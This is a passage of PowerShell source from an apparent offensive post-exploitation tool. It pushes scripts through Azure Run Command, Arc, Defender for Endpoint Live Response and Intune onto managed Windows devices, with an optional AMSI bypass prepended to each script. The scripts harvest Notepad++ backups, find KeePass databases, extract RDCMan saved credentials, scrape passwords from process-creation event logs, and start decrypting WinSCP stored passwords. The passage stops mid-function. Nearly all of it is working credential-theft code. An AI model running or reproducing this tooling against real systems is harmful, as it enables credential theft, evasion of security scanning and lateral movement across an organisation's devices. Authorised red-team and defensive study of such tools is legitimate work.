            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-NotepadExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-notepad-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-NotepadOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# NOTEPAD++ BACKUP EXTRACTION (NetExec -M notepad++)
# ============================================

function Get-NotepadPPExtractionScript {
    return @'
$results = @{
    BackupFiles = @()
    RecentFiles = @()
    Error = $null
}
try {
    $profiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }
    foreach ($profile in $profiles) {
        $backupPath = "$($profile.FullName)\AppData\Roaming\Notepad++\backup"
        if (Test-Path $backupPath) {
            $files = Get-ChildItem $backupPath -File -ErrorAction SilentlyContinue
            foreach ($f in $files) {
                try {
                    $content = [System.IO.File]::ReadAllText($f.FullName, [System.Text.Encoding]::UTF8)
                    if ($content.Length -gt 10000) { $content = $content.Substring(0, 10000) + "...[TRUNCATED]" }
                    $results.BackupFiles += @{
                        User = $profile.Name
                        FilePath = $f.FullName
                        FileName = $f.Name
                        Content = $content
                        SizeBytes = $f.Length
                    }
                } catch {}
            }
        }
        $sessionPath = "$($profile.FullName)\AppData\Roaming\Notepad++\session.xml"
        if (Test-Path $sessionPath) {
            try {
                [xml]$sessionXml = Get-Content $sessionPath -Raw
                $files = $sessionXml.NotepadPlus.Session.mainView.File
                foreach ($f in $files) {
                    if ($f.filename) {
                        $results.RecentFiles += @{
                            User = $profile.Name
                            FilePath = $f.filename
                        }
                    }
                }
            } catch {}
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---NOTEPADPP---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-NotepadPPOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        BackupFiles = @()
        RecentFiles = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "Notepad++ extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---NOTEPADPP---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.BackupFiles = if ($parsed.BackupFiles) { $parsed.BackupFiles } else { @() }
            $result.RecentFiles = if ($parsed.RecentFiles) { $parsed.RecentFiles } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse Notepad++ JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-NotepadPPExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "NOTEPADPP"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "Notepad++ extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-NotepadPPExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-notepadpp-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-NotepadPPOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# KEEPASS DISCOVERY (NetExec -M keepass_discover)
# ============================================

function Get-KeePassDiscoverScript {
    return @'
$results = @{
    ConfigFiles = @()
    Executables = @()
    DatabaseFiles = @()
    RunningProcesses = @()
    Error = $null
}
try {
    $searchPaths = @("C:\Users")
    if (Test-Path $env:PROGRAMFILES) { $searchPaths += $env:PROGRAMFILES }
    if (Test-Path ${env:ProgramFiles(x86)}) { $searchPaths += ${env:ProgramFiles(x86)} }

    foreach ($sp in $searchPaths) {
        $configs = Get-ChildItem -Path $sp -Filter "KeePass.config.xml" -Recurse -ErrorAction SilentlyContinue -Depth 5
        foreach ($c in $configs) {
            $results.ConfigFiles += @{ Path = $c.FullName; LastModified = $c.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") }
        }
        $exes = Get-ChildItem -Path $sp -Filter "KeePass.exe" -Recurse -ErrorAction SilentlyContinue -Depth 5
        foreach ($e in $exes) {
            $results.Executables += @{ Path = $e.FullName; Version = $e.VersionInfo.FileVersion; LastModified = $e.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") }
        }
        $dbs = Get-ChildItem -Path $sp -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue -Depth 5
        foreach ($d in $dbs) {
            $results.DatabaseFiles += @{ Path = $d.FullName; SizeBytes = $d.Length; LastModified = $d.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") }
        }
    }

    try {
        $procs = Get-Process -Name KeePass -IncludeUsername -ErrorAction SilentlyContinue
        foreach ($p in $procs) {
            $results.RunningProcesses += @{
                PID = $p.Id
                UserName = $p.UserName
                ProcessName = $p.ProcessName
                Path = $p.Path
            }
        }
    } catch {
        $procs = Get-Process -Name KeePass -ErrorAction SilentlyContinue
        foreach ($p in $procs) {
            $results.RunningProcesses += @{
                PID = $p.Id
                UserName = ""
                ProcessName = $p.ProcessName
                Path = try { $p.Path } catch { "" }
            }
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---KEEPASS_DISCOVER---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-KeePassDiscoverOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        ConfigFiles = @()
        Executables = @()
        DatabaseFiles = @()
        RunningProcesses = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "KeePass discovery did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---KEEPASS_DISCOVER---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.ConfigFiles = if ($parsed.ConfigFiles) { $parsed.ConfigFiles } else { @() }
            $result.Executables = if ($parsed.Executables) { $parsed.Executables } else { @() }
            $result.DatabaseFiles = if ($parsed.DatabaseFiles) { $parsed.DatabaseFiles } else { @() }
            $result.RunningProcesses = if ($parsed.RunningProcesses) { $parsed.RunningProcesses } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse KeePass discovery JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-KeePassDiscoverExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "KEEPASS_DISCOVER"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "KeePass discovery is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-KeePassDiscoverScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-keepassd-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-KeePassDiscoverOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# RDCMAN CONNECTION EXTRACTION (NetExec -M rdcman)
# ============================================

function Get-RDCManExtractionScript {
    return @'
$results = @{
    Connections = @()
    Error = $null
}
try {
    $profiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }
    foreach ($profile in $profiles) {
        $rdgFiles = @()
        $settingsPath = "$($profile.FullName)\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
        if (Test-Path $settingsPath) {
            try {
                [xml]$settings = Get-Content $settingsPath -Raw
                $recentFiles = $settings.SelectNodes("//FilesToOpen/item")
                foreach ($item in $recentFiles) {
                    if ($item.InnerText -and (Test-Path $item.InnerText)) {
                        $rdgFiles += $item.InnerText
                    }
                }
            } catch {}
        }
        $searchPaths = @("$($profile.FullName)\Documents", "$($profile.FullName)\Desktop", "$($profile.FullName)\Downloads")
        foreach ($sp in $searchPaths) {
            if (Test-Path $sp) {
                $found = Get-ChildItem -Path $sp -Filter "*.rdg" -Recurse -ErrorAction SilentlyContinue -Depth 3
                foreach ($f in $found) { $rdgFiles += $f.FullName }
            }
        }
        $rdgFiles = $rdgFiles | Select-Object -Unique
        foreach ($rdgFile in $rdgFiles) {
            try {
                [xml]$rdg = Get-Content $rdgFile -Raw
                $servers = $rdg.SelectNodes("//server")
                foreach ($server in $servers) {
                    $serverName = $server.properties.name
                    $logonCreds = $server.logonCredentials
                    if (-not $logonCreds -and $server.properties.logonCredentials) { $logonCreds = $server.properties.logonCredentials }
                    $domain = ""
                    $username = ""
                    $encPassword = ""
                    if ($logonCreds) {
                        $domain = if ($logonCreds.domain) { $logonCreds.domain } else { "" }
                        $username = if ($logonCreds.userName) { $logonCreds.userName } else { "" }
                        $encPassword = if ($logonCreds.password) { $logonCreds.password } else { "" }
                    }
                    if ($serverName) {
                        $results.Connections += @{
                            User = $profile.Name
                            ServerName = $serverName
                            Domain = $domain
                            Username = $username
                            EncryptedPassword = $encPassword
                            RDGFilePath = $rdgFile
                        }
                    }
                }
            } catch {}
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---RDCMAN---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-RDCManOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Connections = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "RDCMan extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---RDCMAN---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Connections = if ($parsed.Connections) { $parsed.Connections } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse RDCMan JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-RDCManExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "RDCMAN"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "RDCMan extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-RDCManExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-rdcman-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-RDCManOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# EVENT LOG CREDENTIAL EXTRACTION (NetExec -M eventlog_creds)
# ============================================

function Get-EventLogCredsScript {
    return @'
$results = @{
    Credentials = @()
    Error = $null
}
try {
    $patterns = @(
        @{ Regex = 'net\s+user\s+(\S+)\s+(\S+)'; UserIdx = 1; PassIdx = 2 }
        @{ Regex = 'net\s+use\s+.*\/user:(\S+)\s+(\S+)'; UserIdx = 1; PassIdx = 2 }
        @{ Regex = 'schtasks.*\/U\s+(\S+).*\/P\s+(\S+)'; UserIdx = 1; PassIdx = 2 }
        @{ Regex = 'psexec.*-u\s+(\S+)\s+-p\s+(\S+)'; UserIdx = 1; PassIdx = 2 }
        @{ Regex = 'cmdkey\s+.*\/user:(\S+)\s+.*\/pass:(\S+)'; UserIdx = 1; PassIdx = 2 }
        @{ Regex = '-[Pp]assword\s+[''"]?(\S+)[''"]?'; UserIdx = -1; PassIdx = 1 }
        @{ Regex = 'runas\s+\/user:(\S+)\s+'; UserIdx = 1; PassIdx = -1 }
    )
    $ignorePasswords = @('/add', '/delete', '/domain', '/yes', '/no', '/active', '/expires', '/times', '/y')
    $events = @()
    try {
        $secEvents = Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 1000 -ErrorAction SilentlyContinue
        if ($secEvents) { $events += $secEvents }
    } catch {}
    try {
        $sysmonEvents = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} -MaxEvents 1000 -ErrorAction SilentlyContinue
        if ($sysmonEvents) { $events += $sysmonEvents }
    } catch {}
    foreach ($event in $events) {
        $cmdLine = ""
        if ($event.Id -eq 4688) {
            try { $cmdLine = $event.Properties[8].Value } catch {}
        } elseif ($event.Id -eq 1) {
            try {
                [xml]$evtXml = $event.ToXml()
                $cmdLine = ($evtXml.Event.EventData.Data | Where-Object { $_.Name -eq 'CommandLine' }).'#text'
            } catch {}
        }
        if (-not $cmdLine -or $cmdLine.Length -lt 10) { continue }
        foreach ($p in $patterns) {
            $matches = [regex]::Matches($cmdLine, $p.Regex, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            foreach ($m in $matches) {
                $username = if ($p.UserIdx -gt 0) { $m.Groups[$p.UserIdx].Value } else { "" }
                $password = if ($p.PassIdx -gt 0) { $m.Groups[$p.PassIdx].Value } else { "" }
                if ($password -and $password.Length -ge 6 -and $password -notin $ignorePasswords -and $password -notmatch '^/') {
                    $snippet = if ($cmdLine.Length -gt 100) { $cmdLine.Substring(0, 100) + "..." } else { $cmdLine }
                    $results.Credentials += @{
                        Username = $username
                        Password = $password
                        CommandLine = $snippet
                        EventId = $event.Id
                        TimeCreated = $event.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss")
                        Source = if ($event.Id -eq 4688) { "Security" } else { "Sysmon" }
                    }
                }
            }
        }
    }
    $results.Credentials = $results.Credentials | Sort-Object { $_.TimeCreated } -Descending | Select-Object -Unique -Property Username,Password,CommandLine,EventId,TimeCreated,Source
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---EVENTLOG_CREDS---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-EventLogCredsOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Credentials = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "Event log credential extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---EVENTLOG_CREDS---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Credentials = if ($parsed.Credentials) { $parsed.Credentials } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse EventLog creds JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-EventLogCredsExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "EVENTLOG_CREDS"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "Event log credential extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-EventLogCredsScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-evtcreds-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-EventLogCredsOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# WINSCP CREDENTIAL EXTRACTION (NetExec -M winscp)
# ============================================

function Get-WinSCPExtractionScript {
    return @'
$results = @{
    Sessions = @()
    Error = $null
}

function Decrypt-WinSCPPassword {
    param([string]$Host, [string]$User, [string]$Password)
    if (-not $Password -or $Password.Length -lt 4) { return "" }
    try {
        $key = 0xA3
        $values = @()
        for ($i = 0; $i -lt $Password.Length; $i += 2) {
            $hex = $Password.Substring($i, 2)
            $values += [Convert]::ToInt32($hex, 16)
        }
        if ($values.Count -lt 3) { return "" }
        $flag = $values[0]
        $shift = 0
        if ($flag -eq 0xFF) {
            $shift = $values[1]
            $values = $values[2..($values.Count-1)]
        }
        $length = $values[0]
        $values = $values[1..($values.Count-1)]
        $toShift = $shift
        $result = @()
        for ($i = 0; $i -lt $values.Count; $i++) {
            $result += [char](($values[$i] -bxor ($key -bxor ($i % 2 * 0x55))) -band 0xFF)
        }
        $clearText = ($result -join '')
        if ($toShift -gt 0 -and $toShift -lt $clearText.Length) {
            $clearText = $clearText.Substring($toShift)
